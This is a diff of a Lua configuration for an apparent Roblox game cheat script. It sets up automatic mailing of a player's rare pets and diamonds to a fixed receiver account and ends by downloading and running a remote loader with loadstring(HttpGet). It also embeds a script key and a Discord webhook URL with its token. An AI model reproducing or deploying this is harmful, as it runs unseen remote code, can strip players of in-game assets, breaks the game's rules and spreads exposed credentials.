@@ -1,3 +1,5 @@
+script_key="yWWFSyTtOlortrpMwTdgBSelNNQKqvDy";
+
 setfpscap(2)
 
 --game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("World1Teleport"):InvokeServer()
@@ -48,10 +50,17 @@ getgenv().GEVENT_UPGRADES = {
 		"Mega Lucky Dice II V2",
 		"Fire Dice V2",
 	}
+getgenv().GMAIL_RECEIVERS = {"md44gfbjxq"}
+getgenv().GMAIL_ITEMS = {
 
+["All Huges"] = {Class = "Pet", Id = "All Huges", MinAmount = 1},
+
+["Send Diamonds"] = { Class = "Currency", Id = "Diamonds", KeepAmount = "5m", MinAmount = "35m" },
+}
 getgenv().GWEBHOOK_USERID = ""
 getgenv().GWEBHOOK_LINK = "https://discord.com/api/webhooks/1219752138188652614/OC6SJuvKUJgSFSZy7b9bgHmO6I7u68occS8i4aGbjjGN5WCbrWraKCuYjOgLB4ppHu-G"
 getgenv().GHUGE_COUNT = 0 -- amount of huges to keep/not mail
 ----------------------
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ba2dcad2127dcfc04301dfe52ce6c61c.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/34915da4ad87a5028e1fd64efbe3543f.lua"))()
+
